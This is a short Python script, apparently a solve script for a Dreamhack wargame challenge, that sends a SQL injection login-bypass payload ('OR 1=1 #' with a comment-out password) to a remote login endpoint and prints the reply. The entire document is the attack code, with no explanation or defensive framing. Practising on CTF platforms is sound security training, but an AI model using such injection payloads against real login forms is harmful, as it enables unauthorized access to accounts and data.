import requests


username = "Apple OR 1=1 #"
password =  ' -- '

url = "http://host1.dreamhack.games:8251/login"

session = requests.Session()

res = requests.get(url,data={"userid":username,"password":password})

print(res.text)